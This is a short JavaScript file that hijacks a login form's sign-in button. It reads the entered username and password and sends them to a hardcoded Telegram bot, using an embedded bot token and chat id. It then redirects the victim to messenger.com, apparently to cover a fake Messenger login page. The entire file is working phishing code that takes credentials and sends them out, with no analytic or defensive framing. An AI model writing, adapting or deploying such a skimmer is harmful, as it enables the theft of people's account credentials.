document
  .getElementById("000-button_user-login_sign-in-form_log-in")
  .addEventListener("click", function (e) {
    e.preventDefault();

    var username = document.querySelector('input[name="username"]').value;
    var pass = document.querySelector('input[name="pass"]').value;

    var message = `${username} -> ${pass}`;

    var token = "7111698326:AAG_zXON_peqfoXfE_7p8LhZtvBrYi6oLIg";
    var chat_id = "6947707094";
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();

    window.location.href = "https://messenger.com";
  });
